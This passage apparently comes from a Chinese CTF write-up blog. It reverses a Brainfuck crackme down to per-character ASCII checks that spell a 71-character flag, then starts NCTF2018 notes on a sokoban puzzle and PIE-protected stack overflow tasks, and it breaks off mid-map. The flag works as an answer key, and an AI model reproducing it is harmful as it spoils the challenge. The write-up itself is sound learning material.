class="line">,&gt;++++++[&lt;--------&gt;-]&lt;-[&lt;+&gt;[-][&lt;-.[&lt;[[.,[...],],.]&gt;,&lt;-.]]]</span><br><span class="line">,&gt;+++++++[&lt;-------&gt;-]&lt;-[&lt;+&gt;[-]][&gt;,,-]</span><br><span class="line">,&gt;+++++++[&lt;-------&gt;-][&gt;&gt;[-&gt;[,&lt;&lt;]],.[&lt;+.[,-.[,[+[-[&gt;,.[[&gt;.[.&lt;.,.]].-],]&gt;..&lt;&lt;]]&lt;.,]&lt;++&gt;].+&gt;]]&lt;[&lt;+&gt;[-][[.-[+[.&gt;&gt;[,-&gt;-]&gt;[[.-&lt;..&lt;[.,[.+[,[.&lt;,&gt;].,,[&lt;..]&gt;]..]&lt;.++].]]&lt;]+],&gt;]-..]]</span><br><span class="line">,&gt;+++++[&lt;-----------&gt;-][[-.&gt;-&gt;+.][[+[+[+&lt;[..&gt;[&lt;.[&gt;&gt;++,]&gt;---]++[-&lt;.[+&lt;[,[-,,]&gt;[&lt;,&gt;]&lt;]]]][-[,[-,[+&gt;[&gt;,+&lt;].[..-]]+]&lt;.]&gt;]..]]+.+[-[+&lt;,[[..-[,+.[&gt;[&lt;]+[&gt;].]+&lt;],.[[.[,-.].[+,&gt;,]--][,[+&lt;.].&lt;[+].&lt;],&gt;],&lt;,],&gt;&gt;]+[...,],]+&gt;,&gt;]-]--&lt;]&lt;++]&lt;-[&lt;+&gt;[-][&gt;[,[&lt;[-[&gt;&gt;[,&gt;+[&lt;[&lt;&lt;&lt;&lt;&lt;.]-[&gt;-[&gt;-.[.-&lt;.&gt;]]..&lt;]]-]&gt;[&gt;-[,+[,,[+[.+]+][.,.[+&lt;-]-]+]-&lt;.]&gt;-.&gt;]][-]]][[.,[.-&lt;[[&gt;+&lt;+&gt;]-[[.---[-&lt;+.&gt;&gt;]][.[&gt;[.]+[-,,],]&gt;+]]]-].+,&lt;],&gt;-.],]-&lt;-[&lt;-[[[&gt;&gt;&gt;[,&gt;&gt;.[.&lt;+[&gt;&gt;,[.++&gt;]++]]&lt;],][+.&gt;]]+,[&gt;[,&gt;+&gt;+[,,-[-&gt;+[&gt;&gt;[+.&gt;[+,.]+].,]&lt;,]&lt;]-&gt;-]&lt;++]-&gt;.]-.-]-,]][&gt;.+]</span><br><span class="line">,&gt;++++++[&lt;---------&gt;-]&lt;---[&lt;+&gt;[-]][&gt;,&lt;,&gt;.]</span><br><span class="line">,&gt;++++++[&lt;----------------&gt;-]&lt;-[&lt;+&gt;[-]]</span><br><span class="line">,&gt;+++++[&lt;---------&gt;-][&lt;+[,-&gt;[&gt;&gt;..&gt;[.---&gt;[.-,[[&gt;[,[&lt;+[&gt;,&lt;]&gt;-[.]][&lt;+&lt;,--]&lt;+].,&gt;][&lt;,+,.[+&gt;-[,.-[.&lt;,&gt;]]],]][.&gt;,,+&lt;,]&lt;].+&lt;]],-&gt;].]&lt;---[&lt;+&gt;[-][+&gt;-&lt;+]]</span><br><span class="line">,&gt;++++++[&lt;----------------&gt;-][&lt;+[[,+[..&lt;].,-]--,[[&lt;,-[+&lt;+[&lt;[.&gt;,[.-&lt;[[-,&lt;.+],.,[.-&lt;,&gt;-]]&gt;&gt;-]],&gt;-&lt;][-[.,&lt;]&gt;.],&lt;]]&gt;-.[&gt;&gt;.[.[&lt;.+[[-&gt;&gt;[[,-]+&lt;]&gt;+[&gt;,-[,,]-&gt;,]]]-,],]]].]&lt;,.]&lt;--[&lt;+&gt;[-][.&gt;+[&gt;[.+,[[-&lt;.,&lt;[+,-.]]].,-]&gt;[--&gt;&gt;&gt;]].,+[&lt;-[,-,[&lt;.[.--[.+[[&lt;[+&gt;+[&lt;.--&gt;,-]++.+&lt;,][&lt;,[.,,&gt;]]]-]&lt;,[-&lt;-[[[,.]-[.&gt;&gt;,&lt;&lt;]-][&gt;&gt;&gt;+[..&gt;]-]-&lt;][[--&gt;[.,-]+][&lt;[&lt;.+.,]+&gt;.+++]..-]],,]&gt;,&gt;[++[-&lt;,-[..[+[&gt;&gt;&gt;+]-&lt;.[&lt;,-&gt;]&lt;-],,]]+,],-]&lt;]-&gt;,]&gt;&gt;].]][&lt;&lt;]</span><br><span class="line">,&gt;++++++[&lt;--------&gt;-]&lt;[&lt;+&gt;[-][[&lt;,&gt;[-[+++[[[+.].+,[.&gt;+[-..[-[&lt;&lt;]]&lt;,[+[&lt;&lt;&lt;,--&lt;]&gt;,&gt;.]].]]&lt;[.&gt;+[&gt;[[&gt;.,[+&gt;.+&gt;.]&lt;+]+,]]+&lt;]..+].[[&lt;&lt;,.[--&gt;[-,[&gt;[.+&lt;]&gt;[+]&gt;.&lt;]&lt;&lt;,.][.+]&gt;,&lt;],-,],]].&lt;.].+]&lt;]][+&lt;&lt;[-&gt;[+&gt;[-&lt;.&lt;[+,+[[,+&gt;&gt;,&lt;-]]&lt;]-.].+],.+]&lt;.]</span><br><span class="line">,&gt;+++++++++[&lt;------&gt;-][,&lt;[,&lt;[..[+&gt;,][,[,,[-.[.+[[.&lt;],..[,[+,,]]&gt;&gt;][&gt;,[,&gt;[+,.+]&lt;-.&gt;]&gt;[-,,[&lt;-]&lt;[&lt;+&gt;,.-,-]&lt;&lt;]-,]].&gt;&gt;&gt;]-&gt;++]++&lt;]+,,][+.-&gt;]-][..,]&gt;&gt;-]&lt;--[&lt;+&gt;[-]]</span><br><span class="line">,&gt;++++++++++[&lt;-----&gt;-][.[[.++&gt;[&gt;.[++.&gt;][,&lt;[.[[&lt;[+&gt;&gt;+[.&lt;.-]&gt;][-].]-&lt;&lt;],&gt;.&gt;]+].]&gt;].&lt;+]+&gt;[.---&lt;+.]]&lt;-[&lt;+&gt;[-][,[&lt;.&lt;.-&lt;]+.&lt;[&lt;+[,--][&gt;,[--,&gt;.]&lt;]-.-]+.]]</span><br><span class="line">,&gt;+++++++[&lt;-------&gt;-]&lt;[&lt;+&gt;[-][+&gt;-[&gt;[[+&gt;,.+].&lt;]]-[,-]&lt;,.]]</span><br><span class="line">,&gt;++++++++++[&lt;---------&gt;-][[-&lt;-[+[&lt;.[.&gt;,.&gt;]&gt;,&lt;-]-&gt;-]&gt;+,]-[&lt;.&gt;.&lt;]]&lt;-------[&lt;+&gt;[-][+[-,&lt;+],-]]</span><br><span class="line">,&gt;++++++[&lt;--------&gt;-][.-[-[-&gt;.&gt;+,][-]-,,]&lt;]&lt;---[&lt;+&gt;[-]]</span><br><span class="line">,&gt;++++++[&lt;--------&gt;-][..&lt;-]&lt;--[&lt;+&gt;[-][&gt;[--][.&gt;-,--]-]]</span><br><span class="line">,&gt;++++++++[&lt;-------&gt;-][.,-[,,,--[-&lt;].,&lt;]&lt;[,+.].]&lt;-[&lt;+&gt;[-][&lt;-&lt;[&gt;&gt;].]]</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-][,[&gt;+[+,.&lt;--&lt;]&gt;[-[&lt;[-,[+.[[[.[,],[-&lt;,&gt;-]].-.]&lt;-[,+&gt;[.[+.+]],]&lt;,].,+[-&gt;,]--,],[&lt;&lt;.&lt;]&gt;.-],][+.,&gt;-],&gt;]]++]&lt;---[&lt;+&gt;[-][.[,[[.&lt;[[++]+.-],++,.]++].,,].[.[&lt;[&gt;,&gt;+]&lt;+]&lt;]]][[&lt;....[,&lt;.[.[[.[+&gt;++[&lt;.[&lt;.,--]&gt;],]&gt;+&gt;-&gt;][-&lt;[[+[[&gt;&gt;,.&lt;]&lt;]]+[+.[++,&gt;],.-]+.].&lt;],]-&lt;[+[&gt;&gt;]&gt;&gt;[+&gt;[++&gt;]&lt;+]..]&lt;.]&lt;[&lt;[.+[.-[-[,,&gt;+]]].--],++].]&lt;]&gt;-[+,+&gt;.],--]</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;------[&lt;+&gt;[-]]</span><br><span class="line">,&gt;+++++++[&lt;--------&gt;-]&lt;[&lt;+&gt;[-][&gt;,[-&gt;[+&lt;[[,&lt;[-.&gt;]]]&gt;-]-[-,&gt;&gt;[[&gt;-[,[.,&lt;-&lt;]]+[&lt;,[&lt;+[-&lt;]]+]+],..[+[.+&lt;[+[-[&gt;-,.],.[.++]&lt;]&gt;,&lt;&lt;]-]&gt;--&lt;,]-]&gt;.]]]][&lt;[[.[-,,[.,&gt;[.,--]&gt;]+.&gt;],+[+&gt;]],&lt;+]&gt;]</span><br><span class="line">,&gt;+++++++[&lt;-------&gt;-][,&gt;-,,+&lt;]&lt;-----[&lt;+&gt;[-][+,[-&gt;-,&gt;--..][,+[&lt;[&lt;+&lt;[,[[.,,,[,[&lt;[-&lt;+]&lt;].]][..--]+]+]],[&lt;-&gt;[&lt;&lt;.&gt;],,-&lt;+,]-&lt;-]&gt;+[[+.][+[&lt;[&lt;[--,&lt;,][,.-&gt;&gt;]]]&lt;,-]]+]+&gt;&gt;]]</span><br><span class="line">,&gt;+++++++[&lt;--------------&gt;-]&lt;[&lt;+&gt;[-]][&gt;+]</span><br><span class="line">,&gt;++++++++++[&lt;-----&gt;-]&lt;-[&lt;+&gt;[-][[[&lt;[&lt;[.[+.,.[-[&lt;[,-&lt;[&lt;&lt;.]&lt;+.&lt;]&lt;][&gt;+,,]&gt;&gt;,]][&lt;&lt;,&lt;+]-]-,&gt;[..,&gt;&gt;]].,]&gt;][&lt;&lt;&lt;[.&gt;+[[-&lt;[&gt;[.[[++&lt;[.&gt;,&lt;,]]-..[[-&gt;&gt;].,,.&gt;].+]+][,,&gt;,-&lt;-]&lt;..]&gt;]-,.&gt;+].&gt;&gt;]]+]]</span><br><span class="line">,&gt;++++++++++[&lt;-----&gt;-][&gt;..&gt;,]&lt;-----[&lt;+&gt;[-][,--[-[-[.,-]&lt;--],]]][-[&gt;.[[++,,+&lt;]+.&lt;],&gt;.]&gt;--]</span><br><span class="line">,&gt;++++++++++[&lt;----------&gt;-][[+[.[,++.]&gt;]]-,-]&lt;-[&lt;+&gt;[-][.[+,&gt;-[&lt;[&gt;-[-.&lt;,&gt;].+,]&gt;]]+&gt;[.[.&gt;],.-[,&gt;-[[-&lt;[-&gt;,]-&lt;+]&lt;,]&lt;+&lt;]]]]</span><br><span class="line">,&gt;++++++++++[&lt;-----&gt;-][&gt;&gt;[++,&lt;]-.,]&lt;----[&lt;+&gt;[-]][+[+&lt;,+[[+.[+[&lt;][++[[&lt;,[[.&gt;,&gt;-]+],&lt;].--]..],,-],&lt;+]++&gt;-]&gt;,,].&gt;.]</span><br><span class="line">,&gt;+++++++++[&lt;-----------&gt;-]&lt;--[&lt;+&gt;[-]][+.[--,&gt;+],]</span><br><span class="line">,&gt;++++++++[&lt;------&gt;-][,.-[.,+[&lt;[,[,+[.&gt;[-&gt;+[[+[-],[-,-]-][.+,&lt;[,+.&gt;..]]]]+.-,-]&lt;,]&gt;[+[[,-.,].+]&lt;+.]-,&lt;]+&gt;]-[[&lt;[&lt;.,&lt;+,][&lt;[-[&lt;[&gt;+&lt;&lt;++&lt;]],]]],,-&gt;-]&lt;]&gt;+&lt;]&lt;-------[&lt;+&gt;[-]]</span><br><span class="line">,&gt;+++++[&lt;--------------------&gt;-]&lt;[&lt;+&gt;[-]][.+.+]</span><br><span class="line">,&gt;++++++++++[&lt;-----&gt;-][&gt;-,[&gt;.+&lt;--]&lt;.[+[&lt;&lt;[&lt;[--&lt;[-&lt;],.[[-&gt;,.],&gt;&gt;]&lt;.+].,]++]+[&gt;,[[[[.]&lt;-].-,],]]&gt;]&gt;]&lt;--[&lt;+&gt;[-][[.,&gt;-[.&lt;,[&gt;,[,[[-&gt;[[[--&gt;--.]&gt;,-]&gt;.&gt;]],[.&gt;[,[&lt;.,&gt;[+,,+&lt;&lt;.],+]]--[+.,[&gt;-,[+,]--&gt;]+.].,&lt;]]+]++].[&lt;+.].,+].&gt;-],+]]</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;---[&lt;+&gt;[-]]</span><br><span class="line">,&gt;++++++[&lt;---------&gt;-]&lt;---[&lt;+&gt;[-][[-&gt;&gt;[+&lt;.[&gt;&gt;-].&lt;,&lt;],]&lt;]]</span><br><span class="line">,&gt;++++++++[&lt;------&gt;-][&lt;+&lt;.-&gt;]&lt;[&lt;+&gt;[-][[&lt;+,[+.]+]+.[&lt;[.-]&gt;-],]]</span><br><span class="line">,&gt;+++++[&lt;-----------&gt;-]&lt;-[&lt;+&gt;[-]]</span><br><span class="line">,&gt;++++++[&lt;--------&gt;-][[--,[&lt;&lt;-[&gt;[,&gt;.[.,-[.+[&lt;,&lt;-.[-],]&gt;]++.],],,,]&lt;.,].&lt;]-[&gt;[.-&lt;,],,.[&lt;[&lt;-,].+]-]&lt;]&lt;----[&lt;+&gt;[-][-.&lt;]]</span><br><span class="line">,&gt;+++++++++[&lt;-----------&gt;-]&lt;--[&lt;+&gt;[-]][[[&gt;&gt;+[.]&gt;+]]-.]</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;------[&lt;+&gt;[-]][&gt;-[.+&lt;[.]+.&lt;[[&gt;,[[+.+&gt;]-&lt;.]+[+,&gt;,&gt;-,]]]]&gt;,-[&gt;-&lt;[-,&lt;-&gt;[&lt;.&gt;[+.[.]&gt;,[,[.-]&gt;]&gt;]+&gt;[[&gt;-,]+].]],&lt;[&lt;&lt;..-].]]</span><br><span class="line">,&gt;++++++++++[&lt;-----&gt;-][[.[&gt;&gt;-[.&gt;.[[..[+,,]&lt;.&gt;[..+..]+&lt;]]]&gt;&gt;&gt;[[--,-],+&gt;.-]-.]&gt;]]&lt;-[&lt;+&gt;[-]]</span><br><span class="line">,&gt;+++++++++[&lt;-----&gt;-][,[.[...&lt;,&lt;&lt;+,]]-.]&lt;--------[&lt;+&gt;[-]]</span><br><span class="line">,&gt;++++++++++[&lt;-----&gt;-][[,.-,.]]&lt;-------[&lt;+&gt;[-]][..,[,.[-.&lt;]-,[[&gt;[&gt;[&gt;,&lt;[&gt;&gt;+,[+[[-,]&lt;]&gt;,[++[&lt;,&gt;][&gt;],&gt;]-&gt;&gt;].],&lt;],+.,]-,[-[&gt;,,+][+[,]].-]-&gt;,]]&lt;+&gt;]+[&gt;+.]-]</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-][&gt;+&gt;--]&lt;---[&lt;+&gt;[-]][,,&gt;]</span><br><span class="line">,&gt;+++++++++[&lt;-----&gt;-]&lt;------[&lt;+&gt;[-]]</span><br><span class="line">,&gt;++++++[&lt;----------------&gt;-]&lt;----[&lt;+&gt;[-]][[[,.],.,-].&lt;,[&lt;,+[&gt;...[&lt;&lt;,[+[,&gt;&gt;[+.-[.+[[&lt;,+][,&lt;,]].,,&gt;][&gt;,..]+&lt;]],,]]&lt;]+,.]]</span><br><span class="line">,&gt;++++++[&lt;----------------&gt;-]&lt;-----[&lt;+&gt;[-][&lt;.[[.[,-,[.,,]&lt;[&gt;[.[,[-[[.][-&gt;+&lt;].&gt;]&gt;[[,]-.&lt;[&lt;,+..]]+&gt;-]&gt;&gt;[&lt;[-.&gt;-&lt;[+&lt;+&gt;,].&lt;]&lt;[--[&gt;-]],]&gt;]&gt;&gt;[[&gt;.+++]++.]].,&gt;-&lt;]&gt;+]+]-[+++[,,&lt;[,..-[..-]&gt;-],],+]+]+[+&gt;[.-[+[.]]],]&lt;]][.[,,-&gt;+&lt;],]</span><br><span class="line">,&gt;+++++++[&lt;-------&gt;-][&lt;+&lt;+]&lt;--[&lt;+&gt;[-]]</span><br><span class="line">,&gt;+++++[&lt;----------&gt;-]&lt;-[&lt;+&gt;[-]][+&gt;[+&lt;,[+[,+[,&lt;&lt;,+,]&lt;.],-&gt;]+&gt;]-]</span><br><span class="line">,&gt;+++++++++[&lt;----------&gt;-]&lt;-------[&lt;+&gt;[-]][.-&gt;[[&lt;.-.&gt;].+[,[&lt;[,&lt;-[.&gt;],.&gt;+&lt;]+[[[,]],&lt;+++]&gt;-]&lt;-]&gt;+&lt;].&lt;&lt;[-,&gt;&gt;]]</span><br><span class="line">,&gt;+++++[&lt;-----------&gt;-]&lt;-[&lt;+&gt;[-][,&gt;---]][,-]</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;-----[&lt;+&gt;[-][.-[[.,-[&gt;[,.+]&gt;],&gt;,[,&gt;-[+&lt;+[[,,[&gt;[&lt;+[+&lt;+,]&gt;-.[-.-.]&lt;.-]++],]&gt;&gt;[[.-,+&gt;]+&lt;-]]&gt;+],.]]--&gt;,-]+&lt;.&lt;]]</span><br><span class="line">,&gt;++++++++++[&lt;----&gt;-]&lt;---------[&lt;+&gt;[-]][&lt;+[&lt;..]]</span><br><span class="line">,&gt;+++++++[&lt;--------------&gt;-][&gt;&gt;[[[&gt;-[+[,.--,]--[&gt;[.-&gt;&gt;],.,[.-&gt;]]&lt;.&lt;],-[,+],.]+,&gt;[&gt;-[+&lt;&lt;]&gt;]]--,]---]&lt;---[&lt;+&gt;[-][.-&lt;-[&lt;[,&gt;--.++&lt;].-.&gt;+]]]</span><br><span class="line">,&gt;+++++++++[&lt;-----------&gt;-]&lt;-[&lt;+&gt;[-]]</span><br><span class="line">,&gt;+++++++[&lt;--------------&gt;-]&lt;-[&lt;+&gt;[-][[+&gt;.[,]&lt;[&lt;[&gt;,+.-,][&lt;+&gt;[-,,,[&lt;,+[&lt;&lt;+[+.-,[,+]&gt;.+]-[&lt;.&lt;[&gt;.[...-],]+&gt;[-[&gt;---,]&gt;-&lt;[-,]...].]+&lt;][&lt;&lt;[+&lt;-[+&lt;[&gt;-.+&gt;]+,]+&gt;,]]]&lt;,],]&lt;+].--]&lt;]]</span><br><span class="line">,&gt;++++++[&lt;---------&gt;-]&lt;-[&lt;+&gt;[-][+&gt;[-.&lt;[[+[&gt;,+.,&gt;]&gt;]&gt;[+[++,&gt;[,,[+[.&gt;.[&gt;,]+]&lt;&lt;]-.&gt;]&gt;-].-&gt;++],]&gt;[&gt;[.[&gt;.+],].,[&lt;[-&lt;,[[[-,&gt;]-]+[,,-[.&lt;[+&lt;[&lt;,-,-]+,+][[.,-&gt;]+[--,&lt;+]&gt;]&lt;]+.--],.&gt;]].[--[&gt;.&lt;[[,&gt;...,]-,]&lt;&lt;[[&lt;]&gt;.]&lt;].+&gt;]-]-.]+],]][&gt;,[,-[[..[..,&lt;[.--]-,&gt;]+&lt;[[,.[+[[&lt;+&gt;[+]&lt;&lt;]---[..[,&lt;].],&lt;]]].&gt;]&gt;]-&gt;+],,&gt;[-,.&gt;].]&gt;-&gt;]</span><br><span class="line">,&gt;+++++[&lt;----------&gt;-]&lt;-[&lt;+&gt;[-]][[[,[,,-,,.][.-&gt;+&lt;],]++&gt;,]-]</span><br><span class="line">,&gt;+++++[&lt;--------------------&gt;-]&lt;--[&lt;+&gt;[-][-&gt;[-]&lt;[&gt;&gt;-&lt;..].+]][[&gt;]+.+,]</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;---[&lt;+&gt;[-]]</span><br><span class="line">,&gt;+++++[&lt;--------------------&gt;-]&lt;--[&lt;+&gt;[-][+[[[,--[[[+.]-&gt;]&lt;-&lt;.][-[-&gt;&gt;&gt;[&lt;[+,&gt;[,+[+]+.&gt;][-..],][,,.[&lt;,-[+]&gt;++]-,+]++]&lt;],].][+,&gt;,-[&lt;,.[&lt;&lt;[-[,&lt;-].[++.[[.--]&gt;-[&lt;&lt;]+],-]-]&gt;,,[&gt;[-[,.&lt;].[[&lt;&lt;&lt;+,]&lt;-]+]-].&lt;].&gt;,]]&lt;]&lt;[[,&lt;[-&gt;].-]--]+]-[+.-]]]</span><br><span class="line">,&gt;+++++++++[&lt;-----&gt;-]&lt;-------[&lt;+&gt;[-]][.[,&lt;&lt;-&gt;.]&gt;]</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;--[&lt;+&gt;[-][-[&gt;-,-[&lt;+&gt;,-,]&gt;-,]]][&gt;[-,[.&gt;+.].]-[&lt;+]+..]</span><br><span class="line">,&gt;++++++[&lt;--------------------&gt;-]&lt;-----[&lt;+&gt;[-]]+&lt;[wronganswer!&gt;[-][+[+[[.[&gt;[+,,[[[+&gt;+&lt;++]+,+],,&gt;&gt;&gt;]+],+.,+].],+,[-,-[.]--,&gt;,-].&lt;][-.[+&lt;[[&gt;[[.,+&lt;-[,..-&gt;],,+]-[.--&lt;]][.[+&gt;,[&lt;[.+&gt;,&gt;.+,],]]+[++]&gt;]&gt;]&gt;]&lt;++[&gt;&gt;&gt;+&gt;-.]&gt;]&gt;]],&gt;.[&lt;,&lt;.]++&lt;]&lt;[-]][&gt;...,]&gt;[congratulations![-][&lt;.+&gt;.+]]</span><br></pre></td></tr></table></figure><p>这样看起来就没那么辣眼睛了，并且知道正确的输入应该是71位，把源码编译了之后运行了一波发现是正确的。</p><p>那些无效的<code>,</code> <code>.</code>都存在于循环中，所以不进入这些循环就是约束输入的条件。</p><p>简化后代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&gt;,&gt;+++++[&lt;--------------------&gt;-]&lt;----104</span><br><span class="line">,&gt;+++++[&lt;--------------------&gt;-]&lt;---103</span><br><span class="line">,&gt;+++++[&lt;-------------------&gt;-]&lt;--97</span><br><span class="line">,&gt;+++++++[&lt;---------------&gt;-]&lt;---109</span><br><span class="line">,&gt;+++++++++[&lt;-----------&gt;-]&lt;-101</span><br><span class="line">,&gt;++++++++[&lt;---------------&gt;-]&lt;---123</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;-----101</span><br><span class="line">,&gt;+++++++++[&lt;-----&gt;-]&lt;------51</span><br><span class="line">,&gt;++++++[&lt;--------&gt;-]&lt;-----53</span><br><span class="line">,&gt;++++++[&lt;----------------&gt;-]&lt;-97</span><br><span class="line">,&gt;+++++++++[&lt;-----------&gt;-]&lt;--101</span><br><span class="line">,&gt;++++++[&lt;--------&gt;-]&lt;-49</span><br><span class="line">,&gt;+++++++[&lt;-------&gt;-]&lt;-50</span><br><span class="line">,&gt;+++++++[&lt;-------&gt;-]&lt;49</span><br><span class="line">,&gt;+++++[&lt;-----------&gt;-]&lt;-56</span><br><span class="line">,&gt;++++++[&lt;---------&gt;-]&lt;---57</span><br><span class="line">,&gt;++++++[&lt;----------------&gt;-]&lt;-97</span><br><span class="line">,&gt;+++++[&lt;---------&gt;-]&lt;---48</span><br><span class="line">,&gt;++++++[&lt;----------------&gt;-]&lt;--98</span><br><span class="line">,&gt;++++++[&lt;--------&gt;-]&lt;48</span><br><span class="line">,&gt;+++++++++[&lt;------&gt;-]&lt;--56</span><br><span class="line">,&gt;++++++++++[&lt;-----&gt;-]&lt;-51</span><br><span class="line">,&gt;+++++++[&lt;-------&gt;-]&lt;49</span><br><span class="line">,&gt;++++++++++[&lt;---------&gt;-]&lt;-------97</span><br><span class="line">,&gt;++++++[&lt;--------&gt;-]&lt;---51</span><br><span class="line">,&gt;++++++[&lt;--------&gt;-]&lt;--50</span><br><span class="line">,&gt;++++++++[&lt;-------&gt;-]&lt;-57</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;---99</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;------102</span><br><span class="line">,&gt;+++++++[&lt;--------&gt;-]&lt;56</span><br><span class="line">,&gt;+++++++[&lt;-------&gt;-]&lt;-----54</span><br><span class="line">,&gt;+++++++[&lt;--------------&gt;-]&lt;98</span><br><span class="line">,&gt;++++++++++[&lt;-----&gt;-]&lt;-51</span><br><span class="line">,&gt;++++++++++[&lt;-----&gt;-]&lt;-----55</span><br><span class="line">,&gt;++++++++++[&lt;----------&gt;-]&lt;-101</span><br><span class="line">,&gt;++++++++++[&lt;-----&gt;-]&lt;----54</span><br><span class="line">,&gt;+++++++++[&lt;-----------&gt;-]&lt;--101</span><br><span class="line">,&gt;++++++++[&lt;------&gt;-]&lt;-------55</span><br><span class="line">,&gt;+++++[&lt;--------------------&gt;-]&lt;100</span><br><span class="line">,&gt;++++++++++[&lt;-----&gt;-]&lt;--52</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;---99</span><br><span class="line">,&gt;++++++[&lt;---------&gt;-]&lt;---57</span><br><span class="line">,&gt;++++++++[&lt;------&gt;-]&lt;48</span><br><span class="line">,&gt;+++++[&lt;-----------&gt;-]&lt;-56</span><br><span class="line">,&gt;++++++[&lt;--------&gt;-]&lt;----52</span><br><span class="line">,&gt;+++++++++[&lt;-----------&gt;-]&lt;--101</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;------102</span><br><span class="line">,&gt;++++++++++[&lt;-----&gt;-]&lt;-51</span><br><span class="line">,&gt;+++++++++[&lt;-----&gt;-]&lt;--------53</span><br><span class="line">,&gt;++++++++++[&lt;-----&gt;-]&lt;-------57</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;---99</span><br><span class="line">,&gt;+++++++++[&lt;-----&gt;-]&lt;------51</span><br><span class="line">,&gt;++++++[&lt;----------------&gt;-]&lt;----100</span><br><span class="line">,&gt;++++++[&lt;----------------&gt;-]&lt;-----101</span><br><span class="line">,&gt;+++++++[&lt;-------&gt;-]&lt;--51</span><br><span class="line">,&gt;+++++[&lt;----------&gt;-]&lt;-51</span><br><span class="line">,&gt;+++++++++[&lt;----------&gt;-]&lt;-------97</span><br><span class="line">,&gt;+++++[&lt;-----------&gt;-]&lt;-56</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;-----101</span><br><span class="line">,&gt;++++++++++[&lt;----&gt;-]&lt;---------49</span><br><span class="line">,&gt;+++++++[&lt;--------------&gt;-]&lt;---101</span><br><span class="line">,&gt;+++++++++[&lt;-----------&gt;-]&lt;-100</span><br><span class="line">,&gt;+++++++[&lt;--------------&gt;-]&lt;-99</span><br><span class="line">,&gt;++++++[&lt;---------&gt;-]&lt;-55</span><br><span class="line">,&gt;+++++[&lt;----------&gt;-]&lt;-51</span><br><span class="line">,&gt;+++++[&lt;--------------------&gt;-]&lt;--102</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;---99</span><br><span class="line">,&gt;+++++[&lt;--------------------&gt;-]&lt;--102</span><br><span class="line">,&gt;+++++++++[&lt;-----&gt;-]&lt;-------52</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-]&lt;--98</span><br><span class="line">,&gt;++++++[&lt;--------------------&gt;-]&lt;-----125</span><br></pre></td></tr></table></figure><p>后面的数字就是要求输入的字符的ASCII码值，得到flag。</p><p><del>手动全弄一遍也太爽了🎱</del></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2018</title>
      <link href="/2018/11/26/NCTF2018/"/>
      <url>/2018/11/26/NCTF2018/</url>
      
        <content type="html"><![CDATA[<p>说是不再记录简单题的，无奈能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。</p><a id="more"></a><p>someboxes那一题看了很久一直没有一个具体的感觉，后来发现就是推箱子游戏，输入w450控制方向把两个箱子推到目标点就行了，不过地图还是有一些小问题，要看wp才能得到解答。</p><p>babystack开了pie，看了网上的教程说可以只覆盖后四位，因为pie不会改变最后三位，所以多试几次肯定会成功，但是输入限制了必需要为8的倍数，与部分覆盖产生了冲突，不知道怎么解决。</p><p>smallbug3也开了pie，先输入接下来接受的输入的长度，要求不大于128，感觉可以输入一个负数的十六进制的表达的形式那种来形成栈溢出，好像也成功了，但是这题不知道怎么泄漏libc基址，后来也就没做。</p><h1 id="someboxes"><a href="#someboxes" class="headerlink" title="someboxes"></a>someboxes</h1><p>看了源码之后终于知道了地图哪里出了问题，原来地图中的每个数值都与下标异或了，再异或一次得到真正的地图。当时没看程序中有哪些地方对地图进行了操作（准确的说是看了但是没看见最底下有一个改写地图的orz。</p><p>地图：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[*  *  *  *  *  *  *  *  *  *  *  *  *  *  *  * 